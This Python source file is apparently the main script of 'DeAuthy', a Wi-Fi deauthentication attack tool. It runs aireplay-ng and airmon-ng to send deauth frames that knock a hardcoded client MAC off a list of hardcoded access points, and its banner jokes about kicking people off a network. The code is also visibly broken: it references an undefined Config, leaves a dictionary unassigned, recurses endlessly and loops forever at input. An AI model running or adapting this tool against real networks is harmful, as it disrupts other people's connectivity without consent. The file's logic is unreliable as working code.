from deauthy.auto_installer import Dependencies
Dependencies.installed(self=Dependencies)
from socket import if_nameindex
from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
from sys import exit
from halo import Halo
from deauthy.deauthy_types import BSSID, ESSID, Interface
from deauthy.terminal import Terminal
from deauthy.checks import Checks
from deauthy.functs import Functs

red         = Terminal.Red
cyan        = Terminal.Cyan
blue        = Terminal.Blue
white       = Terminal.White
bold        = Terminal.Bold
yellow      = Terminal.Yellow
light_green = Terminal.Light_green
light_white = Terminal.Light_white
end         = Terminal.End
light_blue  = Terminal.Light_blue
underline   = Terminal.Underline

current_wiface = f""

# Beautiful is better than ugly.
# Explicit is better than implicit.
# Simple is better than complex.
# Complex is better than complicated.
# Flat is better than nested.
# Sparse is better than dense.
# Readability counts.
# Special cases aren't special enough to break the rules.
# Although practicality beats purity.
# Errors should never pass silently.
# Unless explicitly silenced.
# In the face of ambiguity, refuse the temptation to guess.
# There should be one-- and preferably only one --obvious way to do it.
# Although that way may not be obvious at first unless you're Dutch.
# Now is better than never.
# Although never is often better than *right* now.
# If the implementation is hard to explain, it's a bad idea.
# If the implementation is easy to explain, it may be a good idea.
# Namespaces are one honking great idea -- let's do more of those!

{
    "28:C7:CE:4E:AF:B0":1,
    "28:c7:ce:4e:af:bf":1,
    "50:1C:BF:E2:DE:F0":11,
    "28:C7:CE:4F:06:C0":1,
    "28:C7:CE:4F:04:F0":6,
} 
STATION = "8C:F5:A3:38:CC:73" # aka client mac address, the device you wish to deauthenticate

def clear():
    check_call(["clear"])

class Appearance:

    def printBanner():
        clear()
        print(red + """

██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗██╗   ██╗
██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║╚██╗ ██╔╝
██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║ ╚████╔╝ 
██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║  ╚██╔╝  
██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║   ██║   
╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝                             
        """ + light_green + """
Time to kick off some assholes from yer net""")
        return True

class BSSID_METHOD:
    def deauth(bSSID: BSSID):
        """"""
        channel = Config.BSSIDs[bSSID]
        ChannelSys.hopper(channel)
        try:
            out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
        except KeyboardInterrupt:
            Functs.switch(Interface(current_wiface), "managed")
            return
class ESSID_METHOD:
    def deauth(eSSID: str):
        """"""
        channel = Config.ESSID[eSSID]
        ChannelSys.hopper(channel)
        try:
            out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
        except KeyboardInterrupt:
            Functs.switch(Interface(current_wiface), "managed")
            return

class ChannelSys:
    def hopper(channel_number: int):
        """Hop to a different channel"""
        out = check_call(["airmon-ng", "start", f"{current_wiface}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)

def main():
    def do_bssid_method():
        for bssid, channel in Config.BSSIDs.items():
            BSSID_METHOD.deauth(bssid)
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            Functs.switch(card=Interface(current_wiface), mode="managed")
            return
    
    Terminal.inform(msg=f"{bold}{light_green}Hey! {end}{light_white}Tip of the day: Parrot Security or Kali Linux is recommended! Although, real control freaks use ArchLinux")
    Terminal.inform(msg=f"""{white}Type {light_white}"{white}!help{light_white}"{white} for a list of commands!""")
    if Checks.has_root():
        Terminal.inform(msg=f"{white}Running as {light_green}{bold}Root{end}")
    Terminal.prompt(question=Terminal.deauthy_non_tag+"SH", allowed_replies=["any"], ending_color=yellow)

    method = Terminal.prompt(question="Use ESSID or BSSIDs (BSSID / ESSID)", allowed_replies=["bssid", "essid"])
    if method == "BSSID":
        try:
            amt_of_bssids   = Terminal.prompt(question=f"How many BSSIDs?", allowed_replies=["any"])
            numb_of_bssids  = int(amt_of_bssids)
            bssids_added = 0
            while bssids_added < numb_of_bssids:
                Terminal.prompt(question=f"{white}Enter BSSID {light_green}{bold}{bssids_added+1}{end}{white}/{amt_of_bssids}", allowed_replies=["any"])
            do_bssid_method()
        except KeyboardInterrupt:
            Functs.switch(Interface(current_wiface), "managed")
            return
    elif method == "ESSID":
        ESSID_METHOD.deauth(Config.ESSID)
        return

try:
    if not Checks.has_root():
        Terminal.tell_issue(msg=f"{bold}{red}Run it as root...{end}")
        exit(1)
    Appearance.printBanner()
    main()
except KeyboardInterrupt:
    quit(0)